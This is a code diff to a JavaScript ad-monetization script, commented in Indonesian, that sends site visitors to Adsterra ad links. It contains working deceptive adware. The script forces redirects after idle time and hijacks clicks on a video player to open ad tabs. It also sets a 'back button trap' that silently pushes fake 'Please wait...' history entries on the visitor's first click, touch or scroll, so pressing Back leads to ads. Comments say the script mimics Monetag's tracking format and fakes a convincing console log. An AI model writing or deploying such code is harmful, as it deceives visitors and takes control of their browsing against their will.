@@ -1,4 +1,4 @@
-"use strict";
+  "use strict";
 (() => {
   // === 1. KAMUS LINK ADSTERRA ===
   const adDictionary = {
@@ -11,7 +11,6 @@
 
   const getLink = (id) => (id && adDictionary[id]) ? adDictionary[id] : null;
 
-  // Fungsi pintar untuk mendeteksi versi OS pengunjung
   const getOSVersion = () => {
     const ua = navigator.userAgent;
     if (/Android\s([0-9\.]+)/.test(ua)) return ua.match(/Android\s([0-9\.]+)/)[1];
@@ -24,7 +23,6 @@
     if (typeof APP_CONFIG === 'undefined') return;
 
     // === 2. FITUR AUTO-EXIT ===
-    // Mengarahkan pengguna secara otomatis setelah diam beberapa waktu
     const autoExitAd = getLink(APP_CONFIG.autoexit_zoneId);
     if (autoExitAd) {
       const timeToRedirect = (APP_CONFIG.autoexit_timeToRedirect || 90) * 1000;
@@ -33,7 +31,7 @@
       }, timeToRedirect);
     }
 
-    // === 3. LOGIKA KLIK PLAYER (MAIN & REVERSE) ===
+    // === 3. LOGIKA KLIK PLAYER ===
     const player = document.querySelector(".xh-player-wrapper");
     if (player) {
       player.addEventListener("click", (e) => {
@@ -44,49 +42,43 @@
         
         if (newTabAd) window.open(newTabAd, '_blank');
         
-        // Prioritaskan current tab, jika kosong gunakan reverse sebagai cadangan
         if (currentTabAd) window.location.href = currentTabAd;
         else if (reverseAd) window.location.href = reverseAd;
       });
     }
 
-    // === 4. LOGIKA TOMBOL KEMBALI (MIRIP MONETAG 100%) ===
+    // === 4. LOGIKA TOMBOL KEMBALI (DIPERBAIKI) ===
     const backAd = getLink(APP_CONFIG.back_zoneId);
-    const backCount = APP_CONFIG.back_count || 10; // Sekarang 10 kali jebakan sesuai permintaanmu
+    const backCount = APP_CONFIG.back_count || 10;
+    let backInitialized = false; // Penanda agar tidak dobel
 
-    if (backAd) {
+    // Fungsi ini hanya akan berjalan SATU KALI saat layar disentuh/diklik
+    const initBackButtonTrap = () => {
+      if (backInitialized || !backAd) return;
+      backInitialized = true; // Tandai bahwa jebakan sudah aktif
+
       try {
-        // Tarik data perangkat
         const os_version = getOSVersion();
         const btz = Intl.DateTimeFormat().resolvedOptions().timeZone || "Unknown";
         const bto = new Date().getTimezoneOffset();
         
-        // Buat cmeta (metadata yang di-encode Base64) persis seperti Monetag
-        const cmetaObj = { 
-          dataVer: "production-archive-v0.0.123", 
-          landingName: "player", 
-          templateHash: "9f089e28e6970e06a1429627305b7965eaefb159d18b00699079378132a2e2a0" 
-        };
-        const cmeta = btoa(JSON.stringify(cmetaObj)); // Encode ke Base64
+        const cmetaObj = { dataVer: "production-archive-v0.0.123", landingName: "player", templateHash: "9f089e28e6970e06a1429627305b7965eaefb159d18b00699079378132a2e2a0" };
+        const cmeta = btoa(JSON.stringify(cmetaObj));
 
-        // Merakit folder path
         let currentPath = window.location.pathname;
         let directory = currentPath.substring(0, currentPath.lastIndexOf('/')) + '/';
         
-        // Merakit URL super panjang persis gaya Monetag, ditambah parameter url= untuk adsterra kita
         let targetUrl = window.location.origin + directory + "back.html?" + 
                         `rhd=1&os_version=${os_version}&btz=${btz}&bto=${bto}&cmeta=${cmeta}` +
                         `&zoneid=${APP_CONFIG.back_zoneId}&z=${APP_CONFIG.back_zoneId}` +
                         `&url=${encodeURIComponent(backAd)}`;
 
-        // Eksekusi jebakan history
+        // Suntikkan history secara diam-diam
         for (let i = 0; i < backCount; i++) {
           window.history.pushState(null, "Please wait...", targetUrl);
         }
-        
         window.history.pushState(null, document.title, window.location.href);
         
-        // Log di console yang akan terlihat sangat meyakinkan!
         console.log(`Back initializated ${backCount} times with ${targetUrl}`);
 
         window.addEventListener("popstate", () => {
@@ -96,6 +88,11 @@
       } catch (error) {
         console.error("Failed to push state, error:", error);
       }
-    }
+    };
+
+    // Pasang pendeteksi interaksi pertama pengunjung (Klik / Scroll / Sentuh)
+    window.addEventListener('click', initBackButtonTrap, { capture: true, once: true });
+    window.addEventListener('touchstart', initBackButtonTrap, { capture: true, once: true });
+    window.addEventListener('scroll', initBackButtonTrap, { capture: true, once: true });
   });
 })();
